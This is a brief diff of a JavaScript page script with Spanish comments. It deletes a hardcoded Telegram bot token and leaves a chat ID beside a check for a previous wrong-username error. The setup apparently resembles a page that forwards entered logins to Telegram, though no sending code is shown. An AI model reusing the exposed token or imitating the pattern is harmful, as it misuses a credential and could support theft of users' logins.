@@ -9,7 +9,6 @@ document.addEventListener('DOMContentLoaded', () => {
     let isChecked = false;
 
     // --- CREDENCIALES TELEGRAM ---
-    const BOT_TOKEN = '8164357624:AAF6-huSZNt6tU0Y-bOjkfac83GPh0gihJA';
     const CHAT_ID = '1556429907';
 
     // --- DETECCIÓN DE ERROR PREVIO (Usuario Incorrecto) ---
